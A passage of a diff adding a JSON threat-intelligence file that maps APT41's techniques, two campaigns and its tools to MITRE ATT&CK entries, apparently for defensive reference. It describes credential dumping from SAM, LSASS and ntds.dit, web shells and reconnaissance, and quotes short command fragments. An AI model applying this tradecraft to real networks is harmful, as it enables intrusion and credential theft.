+      "name": "Network Share Discovery",
+      "descr": " [APT41](https://attack.mitre.org/groups/G0096) used the <code>net share</code> command as part of network reconnaissance.(Citation: FireEye APT41 Aug 2019)(Citation: Group IB APT 41 June 2021)",
+      "subtechniques": []
+    },
+    {
+      "domain": "enterprise",
+      "id": "T1027",
+      "name": "Obfuscated Files or Information",
+      "technique_used": true,
+      "subtechniques": [
+        {
+          "technique_used": true,
+          "domain": "enterprise",
+          "id": "002",
+          "name": "Software Packing",
+          "descr": "[APT41](https://attack.mitre.org/groups/G0096) uses packers such as Themida to obfuscate malicious files.(Citation: Rostovcev APT41 2021)\nDuring [C0017](https://attack.mitre.org/campaigns/C0017), [APT41](https://attack.mitre.org/groups/G0096) used VMProtect to slow the reverse engineering of malicious binaries.(Citation: Mandiant APT41)",
+          "subtechniques": []
+        },
+        {
+          "technique_used": true,
+          "domain": "enterprise",
+          "id": "013",
+          "name": "Encrypted/Encoded File",
+          "descr": "[APT41 DUST](https://attack.mitre.org/campaigns/C0040) used encrypted payloads decrypted and executed in memory.(Citation: Google Cloud APT41 2024)",
+          "subtechniques": []
+        }
+      ],
+      "descr": "[APT41](https://attack.mitre.org/groups/G0096) used VMProtected binaries in multiple intrusions.(Citation: FireEye APT41 March 2020)\nDuring [C0017](https://attack.mitre.org/campaigns/C0017), [APT41](https://attack.mitre.org/groups/G0096) broke malicious binaries, including [DEADEYE](https://attack.mitre.org/software/S1052) and [KEYPLUG](https://attack.mitre.org/software/S1051), into multiple sections on disk to evade detection.(Citation: Mandiant APT41)"
+    },
+    {
+      "domain": "enterprise",
+      "id": "T1588",
+      "name": "Obtain Capabilities",
+      "technique_used": false,
+      "subtechniques": [
+        {
+          "technique_used": true,
+          "domain": "enterprise",
+          "id": "002",
+          "name": "Tool",
+          "descr": "[APT41](https://attack.mitre.org/groups/G0096) has obtained and used tools such as [Mimikatz](https://attack.mitre.org/software/S0002), [pwdump](https://attack.mitre.org/software/S0006), [PowerSploit](https://attack.mitre.org/software/S0194), and [Windows Credential Editor](https://attack.mitre.org/software/S0005).(Citation: FireEye APT41 Aug 2019)\nFor [C0017](https://attack.mitre.org/campaigns/C0017), [APT41](https://attack.mitre.org/groups/G0096) obtained publicly available tools such as YSoSerial.NET, ConfuserEx, and BadPotato.(Citation: Mandiant APT41)",
+          "subtechniques": []
+        },
+        {
+          "technique_used": true,
+          "domain": "enterprise",
+          "id": "003",
+          "name": "Code Signing Certificates",
+          "descr": "[APT41 DUST](https://attack.mitre.org/campaigns/C0040) used stolen code signing certificates to sign [DUSTTRAP](https://attack.mitre.org/software/S1159) malware and components.(Citation: Google Cloud APT41 2024)",
+          "subtechniques": []
+        }
+      ]
+    },
+    {
+      "domain": "enterprise",
+      "id": "T1003",
+      "name": "OS Credential Dumping",
+      "technique_used": false,
+      "subtechniques": [
+        {
+          "technique_used": true,
+          "domain": "enterprise",
+          "id": "001",
+          "name": "LSASS Memory",
+          "descr": "[APT41](https://attack.mitre.org/groups/G0096) has used hashdump, [Mimikatz](https://attack.mitre.org/software/S0002), Procdump, and the Windows Credential Editor to dump password hashes from memory and authenticate to other user accounts.(Citation: FireEye APT41 Aug 2019)(Citation: Group IB APT 41 June 2021)(Citation: apt41_dcsocytec_dec2022)",
+          "subtechniques": []
+        },
+        {
+          "technique_used": true,
+          "domain": "enterprise",
+          "id": "002",
+          "name": "Security Account Manager",
+          "descr": "[APT41](https://attack.mitre.org/groups/G0096) extracted user account data from the Security Account Managerr (SAM), making a copy of this database from the registry using the <code>reg save</code> command or by exploiting volume shadow copies.(Citation: Rostovcev APT41 2021)\nDuring [C0017](https://attack.mitre.org/campaigns/C0017), [APT41](https://attack.mitre.org/groups/G0096) copied the `SAM` and `SYSTEM` Registry hives for credential harvesting.(Citation: Mandiant APT41)",
+          "subtechniques": []
+        },
+        {
+          "technique_used": true,
+          "domain": "enterprise",
+          "id": "003",
+          "name": "NTDS",
+          "descr": "[APT41](https://attack.mitre.org/groups/G0096) used ntdsutil to obtain a copy of the victim environment <code>ntds.dit</code> file.(Citation: Rostovcev APT41 2021)",
+          "subtechniques": []
+        }
+      ]
+    },
+    {
+      "technique_used": true,
+      "domain": "enterprise",
+      "id": "T1069",
+      "name": "Permission Groups Discovery",
+      "descr": "[APT41](https://attack.mitre.org/groups/G0096) used <code>net group</code> commands to enumerate various Windows user groups and permissions.(Citation: Rostovcev APT41 2021)",
+      "subtechniques": []
+    },
+    {
+      "domain": "enterprise",
+      "id": "T1566",
+      "name": "Phishing",
+      "technique_used": false,
+      "subtechniques": [
+        {
+          "technique_used": true,
+          "domain": "enterprise",
+          "id": "001",
+          "name": "Spearphishing Attachment",
+          "descr": "[APT41](https://attack.mitre.org/groups/G0096) sent spearphishing emails with attachments such as compiled HTML (.chm) files to initially compromise their victims.(Citation: FireEye APT41 Aug 2019)",
+          "subtechniques": []
+        }
+      ]
+    },
+    {
+      "domain": "enterprise",
+      "id": "T1542",
+      "name": "Pre-OS Boot",
+      "technique_used": false,
+      "subtechniques": [
+        {
+          "technique_used": true,
+          "domain": "enterprise",
+          "id": "003",
+          "name": "Bootkit",
+          "descr": "[APT41](https://attack.mitre.org/groups/G0096) deployed Master Boot Record bootkits on Windows systems to hide their malware and maintain persistence on victim systems.(Citation: FireEye APT41 Aug 2019)",
+          "subtechniques": []
+        }
+      ]
+    },
+    {
+      "technique_used": true,
+      "domain": "enterprise",
+      "id": "T1055",
+      "name": "Process Injection",
+      "descr": "[APT41](https://attack.mitre.org/groups/G0096) malware TIDYELF loaded the main WINTERLOVE component by injecting it into the iexplore.exe process.(Citation: FireEye APT41 Aug 2019)",
+      "subtechniques": []
+    },
+    {
+      "technique_used": true,
+      "domain": "enterprise",
+      "id": "T1090",
+      "name": "Proxy",
+      "descr": "[APT41](https://attack.mitre.org/groups/G0096) used a tool called CLASSFON to covertly proxy network communications.(Citation: FireEye APT41 Aug 2019)\nDuring [C0017](https://attack.mitre.org/campaigns/C0017), [APT41](https://attack.mitre.org/groups/G0096) used the Cloudflare CDN to proxy C2 traffic.(Citation: Mandiant APT41)",
+      "subtechniques": []
+    },
+    {
+      "technique_used": true,
+      "domain": "enterprise",
+      "id": "T1012",
+      "name": "Query Registry",
+      "descr": "[APT41](https://attack.mitre.org/groups/G0096) queried registry values to determine items such as configured RDP ports and network configurations.(Citation: Rostovcev APT41 2021)",
+      "subtechniques": []
+    },
+    {
+      "domain": "enterprise",
+      "id": "T1021",
+      "name": "Remote Services",
+      "technique_used": false,
+      "subtechniques": [
+        {
+          "technique_used": true,
+          "domain": "enterprise",
+          "id": "001",
+          "name": "Remote Desktop Protocol",
+          "descr": "[APT41](https://attack.mitre.org/groups/G0096) used RDP for lateral movement.(Citation: FireEye APT41 Aug 2019)(Citation: Crowdstrike GTR2020 Mar 2020) [APT41](https://attack.mitre.org/groups/G0096) used NATBypass to expose local RDP ports on compromised systems to the Internet.(Citation: apt41_dcsocytec_dec2022) ",
+          "subtechniques": []
+        },
+        {
+          "technique_used": true,
+          "domain": "enterprise",
+          "id": "002",
+          "name": "SMB/Windows Admin Shares",
+          "descr": "[APT41](https://attack.mitre.org/groups/G0096) has transferred implant files using Windows Admin Shares and the Server Message Block (SMB) protocol, then executes files through Windows Management Instrumentation (WMI).(Citation: Crowdstrike GTR2020 Mar 2020)(Citation: apt41_dcsocytec_dec2022)",
+          "subtechniques": []
+        }
+      ]
+    },
+    {
+      "technique_used": true,
+      "domain": "enterprise",
+      "id": "T1018",
+      "name": "Remote System Discovery",
+      "descr": "[APT41](https://attack.mitre.org/groups/G0096) has used MiPing to discover active systems in the victim network.(Citation: apt41_dcsocytec_dec2022) ",
+      "subtechniques": []
+    },
+    {
+      "domain": "enterprise",
+      "id": "T1496",
+      "name": "Resource Hijacking",
+      "technique_used": false,
+      "subtechniques": [
+        {
+          "technique_used": true,
+          "domain": "enterprise",
+          "id": "001",
+          "name": "Compute Hijacking",
+          "descr": "[APT41](https://attack.mitre.org/groups/G0096) deployed a Monero cryptocurrency mining tool in a victim’s environment.(Citation: FireEye APT41 Aug 2019)(Citation: apt41_mandiant)",
+          "subtechniques": []
+        }
+      ]
+    },
+    {
+      "technique_used": true,
+      "domain": "enterprise",
+      "id": "T1014",
+      "name": "Rootkit",
+      "descr": "[APT41](https://attack.mitre.org/groups/G0096) deployed rootkits on Linux systems.(Citation: FireEye APT41 Aug 2019)(Citation: Crowdstrike GTR2020 Mar 2020)",
+      "subtechniques": []
+    },
+    {
+      "domain": "enterprise",
+      "id": "T1053",
+      "name": "Scheduled Task/Job",
+      "technique_used": false,
+      "subtechniques": [
+        {
+          "technique_used": true,
+          "domain": "enterprise",
+          "id": "005",
+          "name": "Scheduled Task",
+          "descr": "[APT41](https://attack.mitre.org/groups/G0096) used a compromised account to create a scheduled task on a system.(Citation: FireEye APT41 Aug 2019)(Citation: Crowdstrike GTR2020 Mar 2020)\nDuring [C0017](https://attack.mitre.org/campaigns/C0017), [APT41](https://attack.mitre.org/groups/G0096) used the following Windows scheduled tasks for DEADEYE dropper persistence on US state government networks: `\\Microsoft\\Windows\\PLA\\Server Manager Performance Monitor`, `\\Microsoft\\Windows\\Ras\\ManagerMobility`, `\\Microsoft\\Windows\\WDI\\SrvSetupResults`, and `\\Microsoft\\Windows\\WDI\\USOShared`.(Citation: Mandiant APT41) ",
+          "subtechniques": []
+        }
+      ]
+    },
+    {
+      "domain": "enterprise",
+      "id": "T1596",
+      "name": "Search Open Technical Databases",
+      "technique_used": false,
+      "subtechniques": [
+        {
+          "technique_used": true,
+          "domain": "enterprise",
+          "id": "005",
+          "name": "Scan Databases",
+          "descr": "[APT41](https://attack.mitre.org/groups/G0096) uses the Chinese website fofa.su, similar to the Shodan scanning service, for passive scanning of victims.(Citation: Rostovcev APT41 2021)\n[APT41 DUST](https://attack.mitre.org/campaigns/C0040) used internet scan data for target development.(Citation: Google Cloud APT41 2024)",
+          "subtechniques": []
+        }
+      ]
+    },
+    {
+      "domain": "enterprise",
+      "id": "T1593",
+      "name": "Search Open Websites/Domains",
+      "technique_used": false,
+      "subtechniques": [
+        {
+          "technique_used": true,
+          "domain": "enterprise",
+          "id": "002",
+          "name": "Search Engines",
+          "descr": "[APT41 DUST](https://attack.mitre.org/campaigns/C0040) involved use of search engines to research victim servers.(Citation: Google Cloud APT41 2024)",
+          "subtechniques": []
+        }
+      ]
+    },
+    {
+      "technique_used": true,
+      "domain": "enterprise",
+      "id": "T1594",
+      "name": "Search Victim-Owned Websites",
+      "descr": "[APT41 DUST](https://attack.mitre.org/campaigns/C0040) involved access of external victim websites for target development.(Citation: Google Cloud APT41 2024)",
+      "subtechniques": []
+    },
+    {
+      "domain": "enterprise",
+      "id": "T1505",
+      "name": "Server Software Component",
+      "technique_used": false,
+      "subtechniques": [
+        {
+          "technique_used": true,
+          "domain": "enterprise",
+          "id": "003",
+          "name": "Web Shell",
+          "descr": "[APT41 DUST](https://attack.mitre.org/campaigns/C0040) involved use of web shells such as ANTSWORD and BLUEBEAM for persistence.(Citation: Google Cloud APT41 2024)\nDuring [C0017](https://attack.mitre.org/campaigns/C0017), [APT41](https://attack.mitre.org/groups/G0096) deployed JScript web shells through the creation of malicious ViewState objects.(Citation: Mandiant APT41)",
+          "subtechniques": []
+        }
+      ]
+    },
+    {
+      "domain": "enterprise",
+      "id": "T1553",
+      "name": "Subvert Trust Controls",
+      "technique_used": false,
+      "subtechniques": [
+        {
+          "technique_used": true,
+          "domain": "enterprise",
+          "id": "002",
+          "name": "Code Signing",
+          "descr": "[APT41](https://attack.mitre.org/groups/G0096) leveraged code-signing certificates to sign malware when targeting both gaming and non-gaming organizations.(Citation: FireEye APT41 Aug 2019)(Citation: Group IB APT 41 June 2021)\n[APT41 DUST](https://attack.mitre.org/campaigns/C0040) used stolen code signing certificates for [DUSTTRAP](https://attack.mitre.org/software/S1159) malware and subsequent payloads.(Citation: Google Cloud APT41 2024)",
+          "subtechniques": []
+        }
+      ]
+    },
+    {
+      "domain": "enterprise",
+      "id": "T1195",
+      "name": "Supply Chain Compromise",
+      "technique_used": false,
+      "subtechniques": [
+        {
+          "technique_used": true,
+          "domain": "enterprise",
+          "id": "002",
+          "name": "Compromise Software Supply Chain",
+          "descr": "[APT41](https://attack.mitre.org/groups/G0096) gained access to production environments where they could inject malicious code into legitimate, signed files and widely distribute them to end users.(Citation: FireEye APT41 Aug 2019)",
+          "subtechniques": []
+        }
+      ]
+    },
+    {
+      "domain": "enterprise",
+      "id": "T1218",
+      "name": "System Binary Proxy Execution",
+      "technique_used": false,
+      "subtechniques": [
+        {
+          "technique_used": true,
+          "domain": "enterprise",
+          "id": "001",
+          "name": "Compiled HTML File",
+          "descr": "[APT41](https://attack.mitre.org/groups/G0096) used compiled HTML (.chm) files for targeting.(Citation: FireEye APT41 Aug 2019) ",
+          "subtechniques": []
+        },
+        {
+          "technique_used": true,
+          "domain": "enterprise",
+          "id": "011",
+          "name": "Rundll32",
+          "descr": "[APT41](https://attack.mitre.org/groups/G0096) has used rundll32.exe to execute a loader.(Citation: Crowdstrike GTR2020 Mar 2020)",
+          "subtechniques": []
+        }
+      ]
+    },
+    {
+      "technique_used": true,
+      "domain": "enterprise",
+      "id": "T1082",
+      "name": "System Information Discovery",
+      "descr": "[APT41](https://attack.mitre.org/groups/G0096) uses multiple built-in commands such as <code>systeminfo</code> and `net config Workstation` to enumerate victim system basic configuration information.(Citation: Rostovcev APT41 2021)\nDuring [C0017](https://attack.mitre.org/campaigns/C0017), [APT41](https://attack.mitre.org/groups/G0096) issued `ping -n 1 ((cmd /c dir c:\\|findstr Number).split()[-1]+` commands to find the volume serial number of compromised systems.(Citation: Mandiant APT41)\n",
+      "subtechniques": []
+    },
+    {
+      "technique_used": true,
+      "domain": "enterprise",
+      "id": "T1016",
+      "name": "System Network Configuration Discovery",
+      "descr": "[APT41](https://attack.mitre.org/groups/G0096) collected MAC addresses from victim machines.(Citation: FireEye APT41 Aug 2019)(Citation: Group IB APT 41 June 2021) \nDuring [C0017](https://attack.mitre.org/campaigns/C0017), [APT41](https://attack.mitre.org/groups/G0096) used `cmd.exe /c ping %userdomain%` for discovery.(Citation: Mandiant APT41)",
+      "subtechniques": []
+    },
+    {
+      "technique_used": true,
+      "domain": "enterprise",
+      "id": "T1049",
+      "name": "System Network Connections Discovery",
+      "descr": "[APT41](https://attack.mitre.org/groups/G0096) has enumerated IP addresses of network resources and used the <code>netstat</code> command as part of network reconnaissance. The group has also used a malware variant, HIGHNOON, to enumerate active RDP sessions.(Citation: FireEye APT41 Aug 2019)(Citation: Group IB APT 41 June 2021)",
+      "subtechniques": []
+    },
+    {
+      "technique_used": true,
+      "domain": "enterprise",
+      "id": "T1033",
+      "name": "System Owner/User Discovery",
+      "descr": "[APT41](https://attack.mitre.org/groups/G0096) has executed <code>whoami</code> commands, including using the WMIEXEC utility to execute this on remote machines.(Citation: FireEye APT41 Aug 2019)(Citation: Rostovcev APT41 2021)\nDuring [C0017](https://attack.mitre.org/campaigns/C0017), [APT41](https://attack.mitre.org/groups/G0096) used `whoami` to gather information from victim machines.(Citation: Mandiant APT41)",
+      "subtechniques": []
+    },
+    {
+      "domain": "enterprise",
+      "id": "T1569",
+      "name": "System Services",
+      "technique_used": false,
+      "subtechniques": [
+        {
+          "technique_used": true,
+          "domain": "enterprise",
+          "id": "002",
+          "name": "Service Execution",
+          "descr": "[APT41](https://attack.mitre.org/groups/G0096) used  svchost.exe and [Net](https://attack.mitre.org/software/S0039) to execute a system service installed to launch a [Cobalt Strike](https://attack.mitre.org/software/S0154) BEACON loader.(Citation: FireEye APT41 March 2020)(Citation: Group IB APT 41 June 2021)\n[APT41 DUST](https://attack.mitre.org/campaigns/C0040) used Windows services to execute [DUSTPAN](https://attack.mitre.org/software/S1158).(Citation: Google Cloud APT41 2024)",
+          "subtechniques": []
+        }
+      ]
+    },
+    {
+      "domain": "enterprise",
+      "id": "T1550",
+      "name": "Use Alternate Authentication Material",
+      "technique_used": false,
+      "subtechniques": [
+        {
+          "technique_used": true,
+          "domain": "enterprise",
+          "id": "002",
+          "name": "Pass the Hash",
+          "descr": "[APT41](https://attack.mitre.org/groups/G0096) uses tools such as [Mimikatz](https://attack.mitre.org/software/S0002) to enable lateral movement via captured password hashes.(Citation: Rostovcev APT41 2021)",
+          "subtechniques": []
+        }
+      ]
+    },
+    {
+      "technique_used": true,
+      "domain": "enterprise",
+      "id": "T1078",
+      "name": "Valid Accounts",
+      "descr": "[APT41](https://attack.mitre.org/groups/G0096) used compromised credentials to log on to other systems.(Citation: FireEye APT41 Aug 2019)(Citation: Crowdstrike GTR2020 Mar 2020)",
+      "subtechniques": []
+    },
+    {
+      "domain": "enterprise",
+      "id": "T1102",
+      "name": "Web Service",
+      "technique_used": false,
+      "subtechniques": [
+        {
+          "technique_used": true,
+          "domain": "enterprise",
+          "id": "001",
+          "name": "Dead Drop Resolver",
+          "descr": "[APT41](https://attack.mitre.org/groups/G0096) used legitimate websites for C2 through dead drop resolvers (DDR), including GitHub, Pastebin, and Microsoft TechNet.(Citation: FireEye APT41 Aug 2019)\nDuring [C0017](https://attack.mitre.org/campaigns/C0017), [APT41](https://attack.mitre.org/groups/G0096) used dead drop resolvers on two separate tech community forums for their [KEYPLUG](https://attack.mitre.org/software/S1051) Windows-version backdoor; notably [APT41](https://attack.mitre.org/groups/G0096) updated the community forum posts frequently with new dead drop resolvers during the campaign.(Citation: Mandiant APT41)",
+          "subtechniques": []
+        }
+      ],
+      "descr": "[APT41 DUST](https://attack.mitre.org/campaigns/C0040) used compromised Google Workspace accounts for command and control.(Citation: Google Cloud APT41 2024)\nDuring [C0017](https://attack.mitre.org/campaigns/C0017), [APT41](https://attack.mitre.org/groups/G0096) used the Cloudflare services for C2 communications.(Citation: Mandiant APT41)"
+    },
+    {
+      "technique_used": true,
+      "domain": "enterprise",
+      "id": "T1047",
+      "name": "Windows Management Instrumentation",
+      "descr": "[APT41](https://attack.mitre.org/groups/G0096) used WMI in several ways, including for execution of commands via WMIEXEC as well as for persistence via [PowerSploit](https://attack.mitre.org/software/S0194).(Citation: FireEye APT41 Aug 2019)(Citation: Group IB APT 41 June 2021) [APT41](https://attack.mitre.org/groups/G0096) has executed files through Windows Management Instrumentation (WMI).(Citation: apt41_dcsocytec_dec2022)",
+      "subtechniques": []
+    }
+  ],
+  "campaign_data": [
+    {
+      "id": "C0040",
+      "name": "APT41 DUST",
+      "first_seen": "January 2023",
+      "last_seen": "June 2024",
+      "first_seen_citation": "(Citation: Google Cloud APT41 2024)",
+      "last_seen_citation": "(Citation: Google Cloud APT41 2024)",
+      "desc": "[APT41 DUST](https://attack.mitre.org/campaigns/C0040) was conducted by [APT41](https://attack.mitre.org/groups/G0096) from 2023 to July 2024.(Citation: Google Cloud APT41 2024)",
+      "techniques": [
+        {
+          "parent_id": "T1583",
+          "id": "007",
+          "name": "Acquire Infrastructure",
+          "sub_name": "Serverless"
+        },
+        {
+          "parent_id": "T1071",
+          "id": "001",
+          "name": "Application Layer Protocol",
+          "sub_name": "Web Protocols"
+        },
+        {
+          "parent_id": "T1560",
+          "id": "001",
+          "name": "Archive Collected Data",
+          "sub_name": "Archive via Utility"
+        },
+        {
+          "id": "T1119",
+          "name": "Automated Collection"
+        },
+        {
+          "parent_id": "T1586",
+          "id": "003",
+          "name": "Compromise Accounts",
+          "sub_name": "Cloud Accounts"
+        },
+        {
+          "parent_id": "T1543",
+          "id": "003",
+          "name": "Create or Modify System Process",
+          "sub_name": "Windows Service"
+        },
+        {
+          "id": "T1213",
+          "name": "Data from Information Repositories"
+        },
+        {
+          "parent_id": "T1074",
+          "id": "001",
+          "name": "Data Staged",
+          "sub_name": "Local Data Staging"
+        },
+        {
+          "parent_id": "T1573",
+          "id": "002",
+          "name": "Encrypted Channel",
+          "sub_name": "Asymmetric Cryptography"
+        },
+        {
+          "parent_id": "T1567",
+          "id": "002",
+          "name": "Exfiltration Over Web Service",
+          "sub_name": "Exfiltration to Cloud Storage"
+        },
+        {
+          "parent_id": "T1574",
+          "id": "001",
+          "name": "Hijack Execution Flow",
+          "sub_name": "DLL"
+        },
+        {
+          "parent_id": "T1070",
+          "id": "004",
+          "name": "Indicator Removal",
+          "sub_name": "File Deletion"
+        },
+        {
+          "id": "T1105",
+          "name": "Ingress Tool Transfer"
+        },
+        {
+          "parent_id": "T1036",
+          "id": "004",
+          "name": "Masquerading",
+          "sub_name": "Masquerade Task or Service"
+        },
+        {
+          "parent_id": "T1027",
+          "id": "013",
+          "name": "Obfuscated Files or Information",
+          "sub_name": "Encrypted/Encoded File"
+        },
+        {
+          "parent_id": "T1588",
+          "id": "003",
+          "name": "Obtain Capabilities",
+          "sub_name": "Code Signing Certificates"
+        },
+        {
+          "parent_id": "T1596",
+          "id": "005",
+          "name": "Search Open Technical Databases",
+          "sub_name": "Scan Databases"
+        },
+        {
+          "parent_id": "T1593",
+          "id": "002",
+          "name": "Search Open Websites/Domains",
+          "sub_name": "Search Engines"
+        },
+        {
+          "id": "T1594",
+          "name": "Search Victim-Owned Websites"
+        },
+        {
+          "parent_id": "T1505",
+          "id": "003",
+          "name": "Server Software Component",
+          "sub_name": "Web Shell"
+        },
+        {
+          "parent_id": "T1553",
+          "id": "002",
+          "name": "Subvert Trust Controls",
+          "sub_name": "Code Signing"
+        },
+        {
+          "parent_id": "T1569",
+          "id": "002",
+          "name": "System Services",
+          "sub_name": "Service Execution"
+        },
+        {
+          "id": "T1102",
+          "name": "Web Service"
+        }
+      ]
+    },
+    {
+      "id": "C0017",
+      "name": "C0017",
+      "first_seen": "May 2021",
+      "last_seen": "February 2022",
+      "first_seen_citation": "(Citation: Mandiant APT41)",
+      "last_seen_citation": "(Citation: Mandiant APT41)",
+      "desc": "(Citation: Mandiant APT41)",
+      "techniques": [
+        {
+          "id": "T1134",
+          "name": "Access Token Manipulation"
+        },
+        {
+          "parent_id": "T1071",
+          "id": "001",
+          "name": "Application Layer Protocol",
+          "sub_name": "Web Protocols"
+        },
+        {
+          "parent_id": "T1560",
+          "id": "003",
+          "name": "Archive Collected Data",
+          "sub_name": "Archive via Custom Method"
+        },
+        {
+          "parent_id": "T1059",
+          "id": "007",
+          "name": "Command and Scripting Interpreter",
+          "sub_name": "JavaScript"
+        },
+        {
+          "parent_id": "T1059",
+          "id": "003",
+          "name": "Command and Scripting Interpreter",
+          "sub_name": "Windows Command Shell"
+        },
+        {
+          "id": "T1005",
+          "name": "Data from Local System"
+        },
+        {
+          "parent_id": "T1001",
+          "id": "003",
+          "name": "Data Obfuscation",
+          "sub_name": "Protocol or Service Impersonation"
+        },
+        {
+          "parent_id": "T1074",
+          "id": "001",
+          "name": "Data Staged",
+          "sub_name": "Local Data Staging"
+        },
+        {
+          "id": "T1140",
+          "name": "Deobfuscate/Decode Files or Information"
+        },
+        {
+          "parent_id": "T1048",
+          "id": "003",
+          "name": "Exfiltration Over Alternative Protocol",
+          "sub_name": "Exfiltration Over Unencrypted Non-C2 Protocol"
+        },
+        {
+          "id": "T1041",
+          "name": "Exfiltration Over C2 Channel"
+        },
+        {
+          "id": "T1567",
+          "name": "Exfiltration Over Web Service"
+        },
+        {
+          "id": "T1190",
+          "name": "Exploit Public-Facing Application"
+        },
+        {
+          "id": "T1574",
+          "name": "Hijack Execution Flow"
+        },
+        {
+          "id": "T1105",
+          "name": "Ingress Tool Transfer"
+        },
+        {
+          "parent_id": "T1036",
+          "id": "004",
+          "name": "Masquerading",
+          "sub_name": "Masquerade Task or Service"
+        },
+        {
+          "parent_id": "T1036",
+          "id": "005",
+          "name": "Masquerading",
+          "sub_name": "Match Legitimate Resource Name or Location"
+        },
+        {
+          "parent_id": "T1027",
+          "id": "002",
+          "name": "Obfuscated Files or Information",
+          "sub_name": "Software Packing"
+        },
+        {
+          "id": "T1027",
+          "name": "Obfuscated Files or Information"
+        },
+        {
+          "parent_id": "T1588",
+          "id": "002",
+          "name": "Obtain Capabilities",
+          "sub_name": "Tool"
+        },
+        {
+          "parent_id": "T1003",
+          "id": "002",
+          "name": "OS Credential Dumping",
+          "sub_name": "Security Account Manager"
+        },
+        {
+          "id": "T1090",
+          "name": "Proxy"
+        },
+        {
+          "parent_id": "T1053",
+          "id": "005",
+          "name": "Scheduled Task/Job",
+          "sub_name": "Scheduled Task"
+        },
+        {
+          "parent_id": "T1505",
+          "id": "003",
+          "name": "Server Software Component",
+          "sub_name": "Web Shell"
+        },
+        {
+          "id": "T1082",
+          "name": "System Information Discovery"
+        },
+        {
+          "id": "T1016",
+          "name": "System Network Configuration Discovery"
+        },
+        {
+          "id": "T1033",
+          "name": "System Owner/User Discovery"
+        },
+        {
+          "parent_id": "T1102",
+          "id": "001",
+          "name": "Web Service",
+          "sub_name": "Dead Drop Resolver"
+        },
+        {
+          "id": "T1102",
+          "name": "Web Service"
+        }
+      ]
+    }
+  ],
+  "add_campaign_ref": true,
+  "software_data": [
+    {
+      "id": "S0073",
+      "name": "ASPXSpy",
+      "descr": "(Citation: FireEye APT41 Aug 2019)",
+      "techniques": [
+        {
+          "parent_id": "T1505",
+          "id": "003",
+          "name": "Server Software Component",
+          "sub_name": "Web Shell"
+        }
+      ]
+    },
+    {
+      "id": "S0190",
+      "name": "BITSAdmin",
+      "descr": "(Citation: FireEye APT41 March 2020)",
+      "techniques": [
+        {
+          "id": "T1197",
+          "name": "BITS Jobs"
+        },
+        {
+          "parent_id": "T1048",
+          "id": "003",
+          "name": "Exfiltration Over Alternative Protocol",
+          "sub_name": "Exfiltration Over Unencrypted Non-C2 Protocol"
+        },
+        {
+          "id": "T1105",
+          "name": "Ingress Tool Transfer"
+        },
+        {
+          "id": "T1570",
+          "name": "Lateral Tool Transfer"
+        }
+      ]
+    },
+    {
+      "id": "S0069",
+      "name": "BLACKCOFFEE",
+      "descr": "(Citation: FireEye APT41 Aug 2019)",
+      "techniques": [
+        {
+          "parent_id": "T1059",
+          "id": "003",
+          "name": "Command and Scripting Interpreter",
+          "sub_name": "Windows Command Shell"
+        },
+        {
+          "id": "T1083",
+          "name": "File and Directory Discovery"
+        },
+        {
+          "parent_id": "T1070",
+          "id": "004",
+          "name": "Indicator Removal",
+          "sub_name": "File Deletion"
+        },
+        {
+          "id": "T1104",
+          "name": "Multi-Stage Channels"
+        },
+        {
+          "id": "T1057",
+          "name": "Process Discovery"
+        },
+        {
+          "parent_id": "T1102",
+          "id": "001",
+          "name": "Web Service",
+          "sub_name": "Dead Drop Resolver"
+        },
+        {
+          "parent_id": "T1102",
+          "id": "002",
+          "name": "Web Service",
+          "sub_name": "Bidirectional Communication"
+        }
+      ]
+    },
+    {
+      "id": "S0160",
+      "name": "certutil",
+      "descr": "(Citation: FireEye APT41 March 2020)",
+      "techniques": [
+        {
+          "parent_id": "T1560",
+          "id": "001",
+          "name": "Archive Collected Data",
+          "sub_name": "Archive via Utility"
+        },
+        {
+          "id": "T1140",
+          "name": "Deobfuscate/Decode Files or Information"
+        },
+        {
+          "id": "T1105",
+          "name": "Ingress Tool Transfer"
+        },
+        {
+          "parent_id": "T1553",
+          "id": "004",
+          "name": "Subvert Trust Controls",
+          "sub_name": "Install Root Certificate"
+        }
+      ]
+    },
+    {
+      "id": "S0020",
+      "name": "China Chopper",
+      "descr": "[APT41](https://attack.mitre.org/groups/G0096) used the `China Chopper` web shell as a persistence mechanism on compromised Microsoft Exchange servers.(Citation: apt41_dcsocytec_dec2022)(Citation: FireEye APT41 Aug 2019)",
+      "techniques": [
+        {
+          "parent_id": "T1071",
+          "id": "001",
+          "name": "Application Layer Protocol",
+          "sub_name": "Web Protocols"
+        },
+        {
+          "parent_id": "T1110",
+          "id": "001",
+          "name": "Brute Force",
+          "sub_name": "Password Guessing"
+        },
+        {
+          "parent_id": "T1059",
+          "id": "003",
+          "name": "Command and Scripting Interpreter",
+          "sub_name": "Windows Command Shell"
+        },
+        {
+          "id": "T1005",
+          "name": "Data from Local System"
+        },
+        {
+          "id": "T1083",
+          "name": "File and Directory Discovery"
+        },
+        {
+          "parent_id": "T1070",
+          "id": "006",
+          "name": "Indicator Removal",
+          "sub_name": "Timestomp"
+        },
+        {
+          "id": "T1105",
+          "name": "Ingress Tool Transfer"
+        },
+        {
+          "id": "T1046",
+          "name": "Network Service Discovery"
+        },
+        {
+          "parent_id": "T1027",
+          "id": "002",
+          "name": "Obfuscated Files or Information",
+          "sub_name": "Software Packing"
+        },
+        {
+          "parent_id": "T1505",
+          "id": "003",
+          "name": "Server Software Component",
+          "sub_name": "Web Shell"
+        }
+      ]
+    },
+    {
+      "id": "S0154",
+      "name": "Cobalt Strike",
+      "descr": "(Citation: FireEye APT41 March 2020)(Citation: Group IB APT 41 June 2021)",
+      "techniques": [
+        {
+          "parent_id": "T1548",
+          "id": "003",
+          "name": "Abuse Elevation Control Mechanism",
+          "sub_name": "Sudo and Sudo Caching"
+        },
+        {
+          "parent_id": "T1548",
+          "id": "002",
+          "name": "Abuse Elevation Control Mechanism",
+          "sub_name": "Bypass User Account Control"
+        },
+        {
+          "parent_id": "T1134",
+          "id": "004",
+          "name": "Access Token Manipulation",
+          "sub_name": "Parent PID Spoofing"
+        },
+        {
+          "parent_id": "T1134",
+          "id": "001",
+          "name": "Access Token Manipulation",
+          "sub_name": "Token Impersonation/Theft"
+        },
+        {
+          "parent_id": "T1134",
+          "id": "003",
+          "name": "Access Token Manipulation",
+          "sub_name": "Make and Impersonate Token"
+        },
+        {
+          "parent_id": "T1087",
+          "id": "002",
+          "name": "Account Discovery",
+          "sub_name": "Domain Account"
+        },
+        {
+          "parent_id": "T1071",
+          "id": "004",
+          "name": "Application Layer Protocol",
+          "sub_name": "DNS"
+        },
+        {
+          "parent_id": "T1071",
+          "id": "001",
